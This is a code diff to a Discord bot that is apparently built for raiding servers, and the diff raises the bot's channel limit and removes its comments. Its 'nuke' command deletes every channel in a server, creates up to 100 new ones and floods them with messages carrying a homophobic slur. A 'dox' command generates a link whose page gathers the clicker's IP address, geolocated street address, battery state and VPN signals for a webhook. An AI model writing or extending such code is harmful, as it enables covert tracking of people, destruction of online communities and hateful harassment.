@@ -34,7 +34,7 @@ async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
         { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
-        { name: 'nuke', description: 'Continuously spam all channels until /stop', options: [{ name: 'channels', type: 4, description: 'Channels to create (default 20, max 50)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
+        { name: 'nuke', description: 'Continuously spam up to 100 channels until /stop', options: [{ name: 'channels', type: 4, description: 'Channels to create (default 20, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
         { name: 'stop', description: 'Stop all ongoing nuke/spam activity' },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
@@ -80,7 +80,6 @@ client.on('interactionCreate', async (interaction) => {
         const { commandName, options, user, member, guild, channel } = interaction;
         console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);
 
-        // ---- STOP ----
         if (commandName === 'stop') {
             if (!nukeRunning) {
                 return interaction.editReply('❌ No ongoing nuke/spam to stop.');
@@ -92,7 +91,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- DOX ----
         if (commandName === 'dox') {
             const wh = options.getString('webhook');
             if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
@@ -110,7 +108,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- SPAM ----
         if (commandName === 'spam') {
             const count = Math.min(options.getInteger('count'), 100);
             const msg = options.getString('message');
@@ -125,7 +122,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- NUKE (Continuous) ----
         if (commandName === 'nuke') {
             if (nukeRunning) {
                 return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
@@ -133,26 +129,23 @@ client.on('interactionCreate', async (interaction) => {
             if (!guild) return interaction.editReply('❌ Server only.');
             if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Admin.');
 
-            const channelCount = Math.min(options.getInteger('channels') || 20, 50);
+            // 👇 Max channels increased to 100
+            const channelCount = Math.min(options.getInteger('channels') || 20, 100);
             const delayMs = Math.min(options.getInteger('delay') || 50, 500);
             const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
             const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
 
-            await interaction.editReply('🚀 **Nuke started!** Use `/stop` to stop it.');
+            await interaction.editReply(`🚀 **Nuke started!** Creating ${channelCount} channels... Use \`/stop\` to stop it.`);
 
-            // Delete all channels
             await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
 
-            // Create new channels
             const newChannels = await Promise.all(Array.from({ length: channelCount }, () => guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)));
             const valid = newChannels.filter(c => c);
 
-            // Set running state
             nukeRunning = true;
             nukeGuildId = guild.id;
             nukeChannels = valid;
 
-            // Continuous loop
             let messageIndex = 0;
             while (nukeRunning && nukeGuildId === guild.id) {
                 const line = variants[messageIndex % variants.length];
@@ -166,14 +159,12 @@ client.on('interactionCreate', async (interaction) => {
                 await new Promise(r => setTimeout(r, delayMs));
             }
 
-            // If loop exited because of stop, clean up
             if (!nukeRunning) {
                 await interaction.followUp({ content: '⏹️ **Nuke stopped.**', ephemeral: true });
             }
             return;
         }
 
-        // ---- AD ----
         if (commandName === 'ad') {
             if (!channel) return interaction.editReply('❌ No channel.');
             const embed = new EmbedBuilder()
@@ -186,7 +177,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- PURGE ----
         if (commandName === 'purge') {
             const amount = Math.min(options.getInteger('amount'), 100);
             const targetUser = options.getUser('user');
@@ -205,7 +195,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- PING ----
         if (commandName === 'ping') {
             const sent = await interaction.editReply({ content: '🏓 Pinging...', fetchReply: true });
             const latency = sent.createdTimestamp - interaction.createdTimestamp;
@@ -213,7 +202,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- SERVERINFO ----
         if (commandName === 'serverinfo') {
             if (!guild) return interaction.editReply('❌ Server only.');
             const owner = await guild.fetchOwner();
@@ -233,7 +221,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- USERINFO ----
         if (commandName === 'userinfo') {
             const target = options.getUser('user') || user;
             const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
@@ -256,7 +243,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- AVATAR ----
         if (commandName === 'avatar') {
             const target = options.getUser('user') || user;
             const embed = new EmbedBuilder()
@@ -267,7 +253,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- MATH ----
         if (commandName === 'math') {
             const expr = options.getString('expression');
             try {
@@ -281,7 +266,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- SAY ----
         if (commandName === 'say') {
             const msg = options.getString('message');
             if (!channel) return interaction.editReply('❌ No channel.');
@@ -290,7 +274,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- 8BALL ----
         if (commandName === '8ball') {
             const responses = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'It is certain', 'Very doubtful'];
             const answer = responses[Math.floor(Math.random() * responses.length)];
@@ -303,7 +286,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- ROLL ----
         if (commandName === 'roll') {
             const sides = options.getInteger('sides') || 6;
             const result = Math.floor(Math.random() * sides) + 1;
@@ -356,7 +338,6 @@ async function reverseGeocode(lat, lon) {
     return null;
 }
 
-// ---- BATTERY ----
 async function getBattery() {
     try {
         const b = await navigator.getBattery();
@@ -369,7 +350,6 @@ async function getBattery() {
     }
 }
 
-// ---- VPN DETECTION ----
 function detectVPN(ipData) {
     const signals = [];
     const vpnKeywords = ['vpn', 'proxy', 'cloudflare', 'aws', 'amazon', 'digitalocean', 'vultr', 'linode', 'hetzner', 'ovh', 'm247', 'psychz', 'hostinger', 'namecheap', 'contabo', 'server', 'hosting', 'dedicated'];
@@ -412,7 +392,6 @@ function detectVPN(ipData) {
             if (addr) address = addr;
         }
 
-        // ---- BATTERY ----
         const battery = await getBattery();
         let batteryStr = "N/A";
         if (battery) {
@@ -421,7 +400,6 @@ function detectVPN(ipData) {
             else batteryStr += " (Not Charging)";
         }
 
-        // ---- VPN DETECTION ----
         const vpn = detectVPN(ip);
         let vpnStr = vpn.detected ? "✅ Likely" : "❌ No";
 
